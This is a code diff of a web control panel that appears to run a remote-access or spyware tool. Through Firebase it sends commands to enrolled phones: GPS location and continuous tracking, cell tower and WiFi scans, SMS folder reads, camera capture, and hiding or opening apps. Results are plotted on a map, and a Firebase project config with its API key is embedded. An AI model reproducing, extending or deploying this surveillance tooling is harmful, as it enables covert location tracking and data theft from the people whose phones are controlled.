@@ -1001,7 +1001,6 @@ let auth = null;
 let currentUser = null;
 let pingTimer = null;
 let pingCount = 0;
-let deviceStatusRefreshTimer = null;
 
 const state = {
     devices: [],
@@ -1036,8 +1035,6 @@ const state = {
 
 // ═══════════════════════════════════════════════════════════════════
 //  COMMAND CATALOG — SAME AS ORIGINAL MyControl
-//  FIX: Removed standalone 'stop_tracking' from loc (tracking toggle
-//       modal already has Start/Stop internally)
 // ═══════════════════════════════════════════════════════════════════
 const CAT_NAMES = {
     device: 'Device Control',
@@ -1110,7 +1107,7 @@ const COMMANDS = {
     loc: [
         { icon: '📍', name: 'GPS Once', action: 'get_location' },
         { icon: '🔄', name: 'GPS Tracking', action: 'start_tracking', isTrackingToggle: true, params: { interval_ms: '5000' } },
-        // REMOVED: standalone 'stop_tracking' — tracking toggle modal has Start/Stop built in
+        { icon: '⏹️', name: 'Stop Tracking', action: 'stop_tracking' },
         { icon: '📡', name: 'Cell Towers', action: 'get_cell_towers' },
         { icon: '📶', name: 'WiFi Networks', action: 'get_wifi_networks' },
         { icon: '🔋', name: 'Battery', action: 'get_battery_info' },
@@ -1161,8 +1158,13 @@ function handleLogout() {
     if (state.deviceUnsubscribe) { state.deviceUnsubscribe(); state.deviceUnsubscribe = null; }
     if (state.resultUnsub) { state.resultUnsub(); state.resultUnsub = null; }
     if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
-    if (deviceStatusRefreshTimer) { clearInterval(deviceStatusRefreshTimer); deviceStatusRefreshTimer = null; }
     auth.signOut().then(() => {
+        // Reset state
+        state.devices = [];
+        state.selectedDeviceId = null;
+        state.results = [];
+        state.commandsSent = 0;
+        localStorage.removeItem('phantom_session');
         location.reload();
     });
 }
@@ -1187,15 +1189,17 @@ function initFirebase() {
         appendDiag('Firebase SDK initialized');
         document.getElementById('sidebarStatus').innerHTML = '<span class="loading-spinner" style="width:10px;height:10px;border-width:1.5px;"></span> waiting for auth…';
 
+        // Check if already authenticated
         auth.onAuthStateChanged(user => {
             if (user) {
                 currentUser = user;
                 firebaseInitialized = true;
-                appendDiag('✅ Authenticated: ' + user.uid);
+                appendDiag('✅ Already authenticated: ' + user.uid);
                 document.getElementById('sidebarStatus').innerHTML = '✅ authenticated';
                 document.getElementById('sidebarAuth').textContent = 'UID: ' + user.uid.slice(0, 16) + '…';
                 showApp();
             } else {
+                // Show login screen
                 document.getElementById('sidebarStatus').innerHTML = '🔒 not signed in';
                 document.getElementById('loginScreen').classList.remove('hidden');
                 document.getElementById('appShell').classList.add('hidden');
@@ -1241,6 +1245,7 @@ function showApp() {
     document.getElementById('sidebarUser').textContent = displayName;
     setFirebaseStatus('ok', 'online');
 
+    // Enable history nav
     document.getElementById('navHistory').style.opacity = '1';
     document.getElementById('navHistory').style.pointerEvents = 'auto';
 
@@ -1249,9 +1254,8 @@ function showApp() {
 }
 
 // ═══════════════════════════════════════════════════════════════════
-//  LOAD USER DEVICES
-//  FIX 1: Added periodic device status refresh so online/offline
-//          updates in real-time (every 5 seconds)
+//  LOAD USER DEVICES — reads user_devices/{uid} → deviceIds
+//  then resolves each device doc from devices/{id}
 // ═══════════════════════════════════════════════════════════════════
 async function loadUserDevices() {
     const uid = currentUser.uid;
@@ -1261,10 +1265,11 @@ async function loadUserDevices() {
 
     if (state.deviceUnsubscribe) state.deviceUnsubscribe();
 
-    // Main listener — triggers when the list of assigned device IDs changes
+    // Listen to user_devices/{uid} for real-time updates
     state.deviceUnsubscribe = db.collection('user_devices').doc(uid)
         .onSnapshot(async (docSnap) => {
             state.loadingDevices = false;
+            document.getElementById('dashLastUpdated').textContent = 'Assigned devices loading…';
 
             if (!docSnap.exists) {
                 state.devices = [];
@@ -1278,15 +1283,64 @@ async function loadUserDevices() {
             const data = docSnap.data();
             const deviceIds = data.deviceIds || [];
 
-            await resolveDevices(deviceIds);
+            if (!deviceIds.length) {
+                state.devices = [];
+                renderDeviceList();
+                updateStats();
+                document.getElementById('sidebarDeviceCount').textContent = 'Devices: 0';
+                document.getElementById('dashLastUpdated').textContent = 'No devices assigned';
+                return;
+            }
 
-            // Start periodic status refresh (every 5 seconds) for online/offline updates
-            if (deviceStatusRefreshTimer) clearInterval(deviceStatusRefreshTimer);
-            deviceStatusRefreshTimer = setInterval(() => {
-                if (state.devices.length > 0) {
-                    refreshDeviceStatuses();
+            // Resolve each device ID
+            const devices = [];
+            for (const deviceId of deviceIds) {
+                try {
+                    const devSnap = await db.collection('devices').doc(deviceId).get();
+                    if (devSnap.exists) {
+                        const devData = devSnap.data();
+                        devices.push({
+                            id: deviceId,
+                            deviceName: devData.deviceName || devData.name || `Device ${deviceId}`,
+                            lastSeen: devData.lastSeen || 0,
+                            fcmToken: devData.fcmToken || null,
+                            ...devData
+                        });
+                    } else {
+                        devices.push({
+                            id: deviceId,
+                            deviceName: `Device ${deviceId.slice(0,8)}…`,
+                            lastSeen: 0,
+                            fcmToken: null,
+                            _virtual: true
+                        });
+                    }
+                } catch (err) {
+                    devices.push({
+                        id: deviceId,
+                        deviceName: `Device ${deviceId.slice(0,8)}…`,
+                        lastSeen: 0,
+                        fcmToken: null,
+                        _virtual: true
+                    });
                 }
-            }, 5000);
+            }
+
+            state.devices = devices.sort((a, b) => {
+                const aOn = isOnline(a); const bOn = isOnline(b);
+                if (aOn !== bOn) return aOn ? -1 : 1;
+                return (a.id).localeCompare(b.id);
+            });
+
+            renderDeviceList();
+            updateStats();
+            document.getElementById('sidebarDeviceCount').textContent = 'Devices: ' + state.devices.length;
+
+            const online = devices.filter(d => isOnline(d)).length;
+            document.getElementById('dashLastUpdated').textContent =
+                `${devices.length} assigned · ${online} online · ${new Date().toLocaleTimeString()}`;
+
+            appendDiag(`✅ Loaded ${devices.length} assigned devices (${online} online)`);
 
             // Start ping watch
             pingOfflineDevices();
@@ -1300,116 +1354,9 @@ async function loadUserDevices() {
         });
 }
 
-// Resolve device IDs into full device objects
-async function resolveDevices(deviceIds) {
-    const devices = [];
-    for (const deviceId of deviceIds) {
-        try {
-            const devSnap = await db.collection('devices').doc(deviceId).get();
-            if (devSnap.exists) {
-                const devData = devSnap.data();
-                devices.push({
-                    id: deviceId,
-                    deviceName: devData.deviceName || devData.name || `Device ${deviceId}`,
-                    lastSeen: devData.lastSeen || 0,
-                    fcmToken: devData.fcmToken || null,
-                    ...devData
-                });
-            } else {
-                devices.push({
-                    id: deviceId,
-                    deviceName: `Device ${deviceId.slice(0,8)}…`,
-                    lastSeen: 0,
-                    fcmToken: null,
-                    _virtual: true
-                });
-            }
-        } catch (err) {
-            devices.push({
-                id: deviceId,
-                deviceName: `Device ${deviceId.slice(0,8)}…`,
-                lastSeen: 0,
-                fcmToken: null,
-                _virtual: true
-            });
-        }
-    }
-
-    state.devices = devices.sort((a, b) => {
-        const aOn = isOnline(a); const bOn = isOnline(b);
-        if (aOn !== bOn) return aOn ? -1 : 1;
-        return (a.id).localeCompare(b.id);
-    });
-
-    renderDeviceList();
-    updateStats();
-    document.getElementById('sidebarDeviceCount').textContent = 'Devices: ' + state.devices.length;
-
-    const online = devices.filter(d => isOnline(d)).length;
-    document.getElementById('dashLastUpdated').textContent =
-        `${devices.length} assigned · ${online} online · ${new Date().toLocaleTimeString()}`;
-
-    appendDiag(`✅ Resolved ${devices.length} devices (${online} online)`);
-}
-
-// FIX 1: Refresh device statuses (lastSeen) without reloading the full list
-async function refreshDeviceStatuses() {
-    if (!db || !firebaseInitialized || state.devices.length === 0) return;
-
-    let changed = false;
-    const updatedDevices = [];
-
-    for (const dev of state.devices) {
-        try {
-            const devSnap = await db.collection('devices').doc(dev.id).get();
-            if (devSnap.exists) {
-                const devData = devSnap.data();
-                const newLastSeen = devData.lastSeen || 0;
-                if (newLastSeen !== dev.lastSeen) {
-                    changed = true;
-                    updatedDevices.push({ ...dev, ...devData, lastSeen: newLastSeen });
-                } else {
-                    updatedDevices.push(dev);
-                }
-            } else {
-                updatedDevices.push(dev);
-            }
-        } catch (e) {
-            updatedDevices.push(dev);
-        }
-    }
-
-    if (changed) {
-        state.devices = updatedDevices.sort((a, b) => {
-            const aOn = isOnline(a); const bOn = isOnline(b);
-            if (aOn !== bOn) return aOn ? -1 : 1;
-            return (a.id).localeCompare(b.id);
-        });
-        renderDeviceList();
-        updateStats();
-        appendDiag('🔄 Device statuses refreshed');
-    }
-}
-
 async function refreshDevices() {
     if (!currentUser) { toast('Not signed in', 'error'); return; }
-    // Force re-resolve
-    const uid = currentUser.uid;
-    try {
-        const docSnap = await db.collection('user_devices').doc(uid).get();
-        if (docSnap.exists) {
-            const deviceIds = docSnap.data().deviceIds || [];
-            await resolveDevices(deviceIds);
-            toast('Refreshed ' + deviceIds.length + ' devices', 'success');
-        } else {
-            state.devices = [];
-            renderDeviceList();
-            updateStats();
-            toast('No devices assigned', 'info');
-        }
-    } catch (e) {
-        toast('Refresh error: ' + e.message, 'error');
-    }
+    loadUserDevices();
 }
 
 function isOnline(d) { return (Date.now() - (d.lastSeen || 0)) < 120000; }
@@ -1462,10 +1409,11 @@ function updateStats() {
     const online = state.devices.filter(d => isOnline(d)).length;
     document.getElementById('dashTotalDevices').textContent = total || '0';
     document.getElementById('dashOnlineDevices').textContent = online || '0';
+    document.getElementById('dashLastUpdated').textContent = 'Online: ' + online + '/' + total + ' | Updated: ' + new Date().toLocaleTimeString();
 }
 
 // ═══════════════════════════════════════════════════════════════════
-//  AUTO-PING — wake offline devices
+//  AUTO-PING — only assigned devices
 // ═══════════════════════════════════════════════════════════════════
 async function pingOfflineDevices() {
     if (!firebaseInitialized || !db || state.devices.length === 0) return;
@@ -1576,11 +1524,14 @@ function showView(name) {
     if (name === 'dashboard') {
         pingOfflineDevices();
         if (!pingTimer) pingTimer = setInterval(pingOfflineDevices, 15000);
+        appendDiag('📋 Dashboard active — ping watch started');
+    } else {
+        // Don't stop ping timer globally, keep it for sidebar
     }
 }
 
 // ═══════════════════════════════════════════════════════════════════
-//  SELECT DEVICE
+//  SELECT DEVICE → SAME MyControl COMMAND CENTER
 // ═══════════════════════════════════════════════════════════════════
 function selectDevice(deviceId) {
     state.selectedDeviceId = deviceId;
@@ -1596,6 +1547,7 @@ function selectDevice(deviceId) {
     document.getElementById('cmdDeviceDisplay').title = deviceId;
     document.getElementById('cmdHistoryBtn').style.display = 'inline-flex';
 
+    // Enable command nav
     document.getElementById('navCommand').style.opacity = '1';
     document.getElementById('navCommand').style.pointerEvents = 'auto';
 
@@ -1637,6 +1589,7 @@ async function loadPendingResultsForDevice(deviceId) {
             .get();
 
         const resultSnapshot = await db.collection('results').get();
+
         const resultIds = new Set();
         resultSnapshot.forEach(doc => resultIds.add(doc.id));
 
@@ -1691,8 +1644,6 @@ function refreshPendingResults() {
 
 // ═══════════════════════════════════════════════════════════════════
 //  REAL-TIME RESULTS LISTENER
-//  FIX 2: Match results regardless of local status (sending/sent/pending)
-//         so that confirmations appear reliably
 // ═══════════════════════════════════════════════════════════════════
 function startResultListenerForDevice(deviceId) {
     if (!db || !firebaseInitialized) return;
@@ -1704,15 +1655,12 @@ function startResultListenerForDevice(deviceId) {
                 if (change.type === 'added') {
                     const docId = change.doc.id;
                     const data = change.doc.data();
-
-                    // FIX 2: Match on ANY status — don't restrict to sent/pending
                     const existing = state.results.find(r => r.id === docId);
-                    if (existing) {
+                    if (existing && (existing.status === 'sent' || existing.status === 'pending')) {
                         updateCmdResult(docId, data.status || 'error', data.output || '—');
-                        toast(data.status === 'ok' ? '✓ ' + (existing.name || existing.action) : '✗ ' + (existing.name || existing.action),
+                        toast(data.status === 'ok' ? '✓ ' + existing.name : '✗ ' + existing.name,
                               data.status === 'ok' ? 'success' : 'error');
                     }
-
                     if (data.action === 'location_update' || data.action === 'get_location') {
                         handleLocationResult(data, docId);
                     }
@@ -1722,10 +1670,6 @@ function startResultListenerForDevice(deviceId) {
                     const data = change.doc.data();
                     if (data.action === 'location_update' || data.action === 'get_location') {
                         handleLocationResult(data, docId);
-                    }
-                    const existing = state.results.find(r => r.id === docId);
-                    if (existing) {
-                        updateCmdResult(docId, data.status || 'error', data.output || '—');
                     }
                 }
             });
@@ -1900,30 +1844,12 @@ function startTrackingOnDevice(intervalMs) {
 }
 
 function stopTrackingOnDevice() {
-    // Send stop_tracking action directly to Firestore
-    const deviceId = state.selectedDeviceId;
-    if (!deviceId || !firebaseInitialized || !db) { toast('No device selected', 'error'); return; }
-
-    const cmdId = Date.now() + '_' + Math.random().toString(36).slice(2, 8);
-    const now = new Date().toLocaleTimeString();
-
-    state.results.unshift({
-        id: cmdId, action: 'stop_tracking', name: 'Stop Tracking',
-        status: 'sending', output: 'Sending stop tracking…', time: now, params: {}
-    });
-    renderCmdResults();
-
-    db.collection('commands').doc(cmdId).set({
-        deviceId: deviceId, action: 'stop_tracking', params: {}, createdAt: Date.now()
-    }).then(() => {
-        updateCmdResult(cmdId, 'sent', 'Stop tracking command sent.');
-        state.trackingActive = false;
-        updateTrackingUI();
-        toast('⏹️ GPS Tracking stopped', 'info');
-    }).catch(e => {
-        updateCmdResult(cmdId, 'write_fail', 'Failed: ' + e.message);
-        toast('Failed: ' + e.message, 'error');
-    });
+    const cmd = COMMANDS.loc.find(c => c.action === 'stop_tracking');
+    if (cmd) executeCmd(cmd, {});
+    state.trackingActive = false;
+    if (state.trackingInterval) { clearInterval(state.trackingInterval); state.trackingInterval = null; }
+    updateTrackingUI();
+    toast('⏹️ GPS Tracking stopped', 'info');
 }
 
 function updateTrackingUI() {
@@ -1945,7 +1871,7 @@ function updateTrackingUI() {
 // ═══════════════════════════════════════════════════════════════════
 function executeFindPhone(action) {
     const deviceId = state.selectedDeviceId;
-    if (!deviceId || !firebaseInitialized || !db) { toast('No device selected', 'error'); return; }
+    if (!deviceId || !firebaseInitialized || !db) { toast('No device selected or not connected', 'error'); return; }
 
     const cmdId = Date.now() + '_' + Math.random().toString(36).slice(2, 8);
     const now = new Date().toLocaleTimeString();
@@ -1958,8 +1884,10 @@ function executeFindPhone(action) {
     renderCmdResults();
     setWriteStatus('writing', 'writing find_phone command…');
 
+    const params = { action: action };
+
     db.collection('commands').doc(cmdId).set({
-        deviceId: deviceId, action: 'find_phone', params: { action: action }, createdAt: Date.now()
+        deviceId: deviceId, action: 'find_phone', params: params, createdAt: Date.now()
     }).then(() => {
         updateCmdResult(cmdId, 'sent', `Find Phone ${action} command written. Waiting for device…`);
         toast(`→ ${action === 'start' ? '🔔 Ringing' : '🔕 Stopping'} phone`, 'info');
@@ -2139,8 +2067,14 @@ function showParamModal(cmd) {
     const fields = document.getElementById('modalFields');
     fields.innerHTML = '';
 
-    // Hide all special sections first
-    document.querySelectorAll('#modalToggleSelector, #modalCameraSelector, #modalHideShowSelector, #modalSimSelector, #modalLimitField, #modalSmsFolderSelector, #modalFindPhone, #modalOpenApp').forEach(el => el.style.display = 'none');
+    document.getElementById('modalToggleSelector').style.display = 'none';
+    document.getElementById('modalCameraSelector').style.display = 'none';
+    document.getElementById('modalHideShowSelector').style.display = 'none';
+    document.getElementById('modalSimSelector').style.display = 'none';
+    document.getElementById('modalLimitField').style.display = 'none';
+    document.getElementById('modalSmsFolderSelector').style.display = 'none';
+    document.getElementById('modalFindPhone').style.display = 'none';
+    document.getElementById('modalOpenApp').style.display = 'none';
     document.getElementById('modalDefaultButtons').style.display = 'flex';
     document.getElementById('modalFindPhoneButtons').style.display = 'none';
 
@@ -2166,10 +2100,10 @@ function showParamModal(cmd) {
     if (cmd.hasLimit) { document.getElementById('modalLimitField').style.display = 'block'; document.getElementById('limitInput').value = '50'; }
     if (cmd.simSlot) document.getElementById('modalSimSelector').style.display = 'block';
 
-    // GPS Tracking toggle — shows Start/Stop inline
     if (cmd.isTrackingToggle) {
         if (cmd.params) {
             Object.entries(cmd.params).forEach(([key, val]) => {
+                if (key === 'limit' && cmd.hasLimit) return;
                 const label = document.createElement('label');
                 label.textContent = key.replace(/_/g, ' ');
                 const input = document.createElement('input');
@@ -2204,7 +2138,6 @@ function showParamModal(cmd) {
         return;
     }
 
-    // Seekbar support
     if (cmd.hasSeekbar) {
         const sb = cmd.hasSeekbar;
         const sbId = 'seekbar_' + (++state.seekbarIdCounter);
@@ -2327,7 +2260,7 @@ document.getElementById('resultDetailModal').addEventListener('click', function(
 });
 
 // ═══════════════════════════════════════════════════════════════════
-//  EXECUTE COMMAND — FIX 2: Result listener now matches on ANY status
+//  EXECUTE COMMAND
 // ═══════════════════════════════════════════════════════════════════
 async function executeCmd(cmd, params) {
     const deviceId = state.selectedDeviceId;
@@ -2355,7 +2288,6 @@ async function executeCmd(cmd, params) {
         state.commandsSent++;
         document.getElementById('cmdCountDisplay').textContent = state.commandsSent;
 
-        // FIX 2: Per-command listener — catches the result whenever it arrives
         const unsub = db.collection('results').doc(cmdId).onSnapshot(snap => {
             if (snap.exists) {
                 const d = snap.data();
@@ -2381,7 +2313,7 @@ async function executeCmd(cmd, params) {
 }
 
 // ═══════════════════════════════════════════════════════════════════
-//  FORMAT RESULTS — Unified structured view
+//  FORMAT RESULTS — Unified structured view (same as MyControl)
 // ═══════════════════════════════════════════════════════════════════
 function formatResultOutput(action, output) {
     if (!output || output === '—') return escapeHtml(output);
@@ -2438,7 +2370,6 @@ function formatResultOutput(action, output) {
         }
     }
 
-    // Non-JSON line-based fallback
     if (typeof output === 'string') {
         const lines = output.split('\n').filter(l => l.trim());
         const dataLines = lines.filter(l => /^\[\d+\]/.test(l.trim()));
@@ -2572,500 +2503,248 @@ function renderCmdResults() {
 }
 
 function clearCmdResults() {
-    state.results = [];
-    state.commandsSent = 0;
+    state.results = []; state.commandsSent = 0;
     document.getElementById('cmdCountDisplay').textContent = '0';
+    document.getElementById('cmdLastStatus').textContent = 'Ready';
+    document.getElementById('cmdLastStatus').className = 'value green';
     renderCmdResults();
 }
 
 function retryCmd(id) {
     const found = state.results.find(r => r.id === id);
     if (!found) return;
-    const cmdDef = COMMANDS_ALL.find(c => c.action === found.action);
-    if (cmdDef) {
-        const params = found.params || {};
-        state.results = state.results.filter(r => r.id !== id);
-        renderCmdResults();
-        executeCmd(cmdDef, params);
-    } else {
-        toast('Cannot retry — command definition not found', 'error');
+    state.results = state.results.filter(r => r.id !== id);
+    renderCmdResults();
+    for (const cat of Object.values(COMMANDS)) {
+        const match = cat.find(c => c.action === found.action && c.name === found.name);
+        if (match) { executeCmd(match, found.params || {}); return; }
     }
+    executeCmd({ name: found.name, action: found.action, params: found.params || {} }, found.params || {});
+}
+
+function retryLastFailedCmd() {
+    const failed = state.results.find(r => r.status === 'write_fail' || r.status === 'error');
+    if (failed) retryCmd(failed.id);
+    else toast('No failed commands to retry', 'info');
 }
 
 // ═══════════════════════════════════════════════════════════════════
-//  GPS TRACKING — FIX 3: Redundant stop_tracking command removed from COMMANDS
-//  Toggle modal handles both start/stop. These functions manage the loop.
+//  HISTORY
 // ═══════════════════════════════════════════════════════════════════
-let trackingUnsub = null;
-
-async function startTrackingOnDevice(intervalMs) {
+async function loadFullHistory() {
     const deviceId = state.selectedDeviceId;
-    if (!deviceId || !db) { toast('No device selected', 'error'); return; }
-    const interval = parseInt(intervalMs) || 5000;
-    state.trackingActive = true;
-    toast('📍 GPS tracking started (every ' + interval + 'ms)', 'info');
-
-    const startCmd = COMMANDS_ALL.find(c => c.action === 'start_tracking');
-    if (startCmd) executeCmd(startCmd, { interval_ms: interval });
-
-    if (trackingUnsub) trackingUnsub();
-    trackingUnsub = db.collection('results')
-        .where('deviceId', '==', deviceId)
-        .where('action', '==', 'get_location')
-        .orderBy('createdAt', 'desc')
-        .limit(1)
-        .onSnapshot(snap => {
-            snap.docChanges().forEach(change => {
-                if (change.type === 'added') {
-                    const d = change.doc.data();
-                    handleLocationResult(d, change.doc.id);
-                }
-            });
-        });
-}
-
-function stopTrackingOnDevice() {
-    const deviceId = state.selectedDeviceId;
-    if (!deviceId) { toast('No device selected', 'error'); return; }
-    state.trackingActive = false;
-    if (trackingUnsub) { trackingUnsub(); trackingUnsub = null; }
-
-    const stopCmd = COMMANDS_ALL.find(c => c.action === 'stop_tracking');
-    if (stopCmd) executeCmd(stopCmd, {});
-    toast('⏹️ GPS tracking stopped', 'info');
-}
-
-function handleLocationResult(data, resultId) {
-    if (!data || !data.output) return;
-    try {
-        const parsed = typeof data.output === 'string' ? JSON.parse(data.output) : data.output;
-        const lat = parsed.lat || parsed.latitude || 0;
-        const lng = parsed.lng || parsed.longitude || parsed.lon || 0;
-        if (lat && lng) {
-            if (state.map) state.map.setView([lat, lng], 16);
-            if (state.mapMarker) {
-                state.mapMarker.setLatLng([lat, lng]);
-            } else if (state.map) {
-                state.mapMarker = L.marker([lat, lng]).addTo(state.map)
-                    .bindPopup('📍 Latest GPS ping');
-            }
-            if (state.trackingActive) {
-                state.trackingPath.push([lat, lng]);
-                if (state.pathLine) {
-                    state.pathLine.setLatLngs(state.trackingPath);
-                } else if (state.map) {
-                    state.pathLine = L.polyline(state.trackingPath, {
-                        color: '#6c5ce7', weight: 3, opacity: 0.7
-                    }).addTo(state.map);
-                }
-                const gpsInfo = document.getElementById('gpsInfoDisplay');
-                if (gpsInfo) gpsInfo.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-            }
-        }
-    } catch(e) { /* not a location result */ }
-}
-
-// ═══════════════════════════════════════════════════════════════════
-//  PING WATCH / DIAGNOSTICS
-// ═══════════════════════════════════════════════════════════════════
-function setupPingWatch() {
-    if (!db || !state.selectedDeviceId) return;
-    if (state.pingUnsub) state.pingUnsub();
-
-    state.pingUnsub = db.collection('devices').doc(state.selectedDeviceId)
-        .onSnapshot(snap => {
-            if (!snap.exists) return;
-            const d = snap.data();
-            const lastSeen = d.lastSeen ? d.lastSeen.toDate() : null;
-            const isOnline = lastSeen && (Date.now() - lastSeen.getTime() < 60000);
-            document.getElementById('pingStatus').textContent = isOnline ? 'ONLINE' : 'OFFLINE';
-            document.getElementById('pingStatus').className = isOnline ? 'value green' : 'value red';
-            document.getElementById('pingOnlineBadge').textContent = isOnline ? '● Online' : '○ Offline';
-            document.getElementById('pingOnlineBadge').className = isOnline ? 'online' : 'offline';
-            document.getElementById('deviceStatusText').textContent = isOnline ? 'Online' : 'Offline';
-            document.getElementById('deviceStatusText').className = isOnline ? 'online' : 'offline';
-            document.getElementById('pingLastSeen').textContent = lastSeen
-                ? lastSeen.toLocaleString() : '—';
-            document.getElementById('pingLatency').textContent = d.latency_ms
-                ? d.latency_ms + ' ms' : '—';
-            updateDeviceStatus(state.selectedDeviceId, isOnline);
-        });
-}
-
-// ═══════════════════════════════════════════════════════════════════
-//  FIX 1: Periodic device status refresh — re-reads device docs
-//  to catch online/offline transitions that onSnapshot might miss
-// ═══════════════════════════════════════════════════════════════════
-let statusRefreshInterval = null;
-
-function startStatusRefresh() {
-    stopStatusRefresh();
-    statusRefreshInterval = setInterval(async () => {
-        if (!db || !state.userId) return;
-        try {
-            const devicesSnap = await db.collection('user_devices').doc(state.userId).get();
-            if (!devicesSnap.exists) return;
-            const ids = Object.keys(devicesSnap.data() || {});
-            for (const id of ids) {
-                const devSnap = await db.collection('devices').doc(id).get();
-                if (!devSnap.exists) continue;
-                const d = devSnap.data();
-                const lastSeen = d.lastSeen ? d.lastSeen.toDate() : null;
-                const isOnline = lastSeen && (Date.now() - lastSeen.getTime() < 60000);
-                updateDeviceStatus(id, isOnline);
-                if (id === state.selectedDeviceId) {
-                    document.getElementById('pingStatus').textContent = isOnline ? 'ONLINE' : 'OFFLINE';
-                    document.getElementById('pingStatus').className = isOnline ? 'value green' : 'value red';
-                    document.getElementById('pingOnlineBadge').textContent = isOnline ? '● Online' : '○ Offline';
-                    document.getElementById('pingOnlineBadge').className = isOnline ? 'online' : 'offline';
-                    document.getElementById('deviceStatusText').textContent = isOnline ? 'Online' : 'Offline';
-                    document.getElementById('deviceStatusText').className = isOnline ? 'online' : 'offline';
-                    document.getElementById('pingLastSeen').textContent = lastSeen
-                        ? lastSeen.toLocaleString() : '—';
-                }
-            }
-        } catch(e) { /* silent */ }
-    }, 5000);
-}
-
-function stopStatusRefresh() {
-    if (statusRefreshInterval) {
-        clearInterval(statusRefreshInterval);
-        statusRefreshInterval = null;
-    }
-}
-
-// ═══════════════════════════════════════════════════════════════════
-//  UTILITY FUNCTIONS
-// ═══════════════════════════════════════════════════════════════════
-function escapeHtml(str) {
-    if (str === null || str === undefined) return '';
-    const div = document.createElement('div');
-    div.textContent = String(str);
-    return div.innerHTML;
-}
-
-function toast(msg, type) {
-    const container = document.getElementById('toastContainer');
-    if (!container) return;
-    const el = document.createElement('div');
-    el.className = 'toast toast-' + (type || 'info');
-    el.textContent = msg;
-    container.appendChild(el);
-    setTimeout(() => { el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }, 3000);
-}
-
-function setWriteStatus(state, msg) {
-    const el = document.getElementById('writeStatusIndicator');
-    if (!el) return;
-    el.textContent = '📝 ' + msg;
-    el.className = 'write-indicator write-' + state;
-}
-
-function showView(viewId) {
-    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
-    const target = document.getElementById(viewId);
-    if (target) target.classList.add('active');
-    document.querySelectorAll('.sidebar-nav a').forEach(a => a.classList.remove('active'));
-    const link = document.querySelector(`.sidebar-nav a[data-view="${viewId}"]`);
-    if (link) link.classList.add('active');
-    if (viewId === 'dashboard' && state.devices.length === 0) loadDevices();
-}
-
-// ═══════════════════════════════════════════════════════════════════
-//  MAP — Full screen & inline
-// ═══════════════════════════════════════════════════════════════════
-function openMapView() {
-    showView('mapView');
-    setTimeout(() => {
-        if (state.map) {
-            state.map.invalidateSize();
-        } else {
-            state.map = L.map('fullMap', {
-                center: [20, 0], zoom: 2,
-                zoomControl: true
-            });
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                maxZoom: 19, attribution: '© OpenStreetMap'
-            }).addTo(state.map);
-        }
-        if (state.trackingPath.length > 0) {
-            if (state.pathLine) state.pathLine.setLatLngs(state.trackingPath);
-            else {
-                state.pathLine = L.polyline(state.trackingPath, {
-                    color: '#6c5ce7', weight: 3, opacity: 0.7
-                }).addTo(state.map);
-            }
-            const last = state.trackingPath[state.trackingPath.length - 1];
-            if (last) state.map.setView(last, 16);
-        }
-    }, 100);
-}
-
-function closeMapModal() {
-    document.getElementById('mapModal').classList.remove('open');
-}
-
-// ═══════════════════════════════════════════════════════════════════
-//  FIREBASE AUTH & INIT
-// ═══════════════════════════════════════════════════════════════════
-const FIREBASE_CONFIG = {
-    apiKey: "AIzaSyCgG8wLXuR65FLncfsTW8aWRMtmDNBqZ-M",
-    authDomain: "darx-e8cac.firebaseapp.com",
-    projectId: "darx-e8cac",
-    storageBucket: "darx-e8cac.firebasestorage.app",
-    messagingSenderId: "52307378881",
-    appId: "1:52307378881:web:56f3b9aebf730a6e36ebf5",
-    measurementId: "G-C2EY4BK0EG"
-};
-
-let firebaseInitialized = false;
-let db = null;
-
-function initFirebase() {
-    if (firebaseInitialized) return;
-    try {
-        firebase.initializeApp(FIREBASE_CONFIG);
-        db = firebase.firestore();
-        db.settings({ merge: true });
-        firebaseInitialized = true;
-        console.log('🔥 Firebase initialized');
-    } catch(e) {
-        console.error('Firebase init error:', e);
-    }
-}
-
-// ═══════════════════════════════════════════════════════════════════
-//  LOGIN
-// ═══════════════════════════════════════════════════════════════════
-async function login() {
-    const email = document.getElementById('loginEmail').value.trim();
-    const pass = document.getElementById('loginPass').value;
-    const errEl = document.getElementById('loginError');
-    errEl.style.display = 'none';
-
-    if (!email || !pass) {
-        errEl.textContent = 'Please enter email and password';
-        errEl.style.display = 'block'; return;
-    }
-
-    try {
-        initFirebase();
-        const cred = await firebase.auth().signInWithEmailAndPassword(email, pass);
-        state.userId = cred.user.uid;
-        state.userEmail = cred.user.email;
-
-        document.getElementById('loginScreen').style.display = 'none';
-        document.getElementById('appShell').style.display = 'flex';
-        document.getElementById('usernameDisplay').textContent = cred.user.email.split('@')[0];
-
-        startStatusRefresh();
-        await loadDevices();
-        setupResultListener();
-    } catch(e) {
-        errEl.textContent = e.message;
-        errEl.style.display = 'block';
-    }
-}
-
-function logout() {
-    stopStatusRefresh();
-    if (state.pingUnsub) { state.pingUnsub(); state.pingUnsub = null; }
-    if (trackingUnsub) { trackingUnsub(); trackingUnsub = null; }
-    state.userId = null;
-    state.devices = [];
-    state.selectedDeviceId = null;
-    state.trackingActive = false;
-    state.results = [];
-    firebase.auth().signOut();
-    document.getElementById('appShell').style.display = 'none';
-    document.getElementById('loginScreen').style.display = 'flex';
-}
-
-// ═══════════════════════════════════════════════════════════════════
-//  DEVICE LOADING — reads user_devices/{uid}, resolves to devices/{id}
-// ═══════════════════════════════════════════════════════════════════
-async function loadDevices() {
-    if (!db || !state.userId) return;
-    try {
-        const userDevSnap = await db.collection('user_devices').doc(state.userId).get();
-        if (!userDevSnap.exists) {
-            document.getElementById('deviceList').innerHTML = '<div class="empty">No devices assigned</div>';
-            document.getElementById('deviceSelect').innerHTML = '<option value="">No devices</option>';
-            return;
-        }
-        const deviceIds = Object.keys(userDevSnap.data());
-        const devices = [];
-        for (const id of deviceIds) {
-            try {
-                const devSnap = await db.collection('devices').doc(id).get();
-                if (devSnap.exists) {
-                    const d = devSnap.data();
-                    const lastSeen = d.lastSeen ? d.lastSeen.toDate() : null;
-                    const isOnline = lastSeen && (Date.now() - lastSeen.getTime() < 60000);
-                    devices.push({
-                        id: id,
-                        name: d.name || d.deviceName || d.model || 'Device',
-                        model: d.model || d.deviceName || '—',
-                        platform: d.platform || d.os || '—',
-                        lastSeen: lastSeen,
-                        isOnline: isOnline,
-                        ...d
-                    });
-                }
-            } catch(e) { /* skip */ }
-        }
-        state.devices = devices;
-        renderDeviceList();
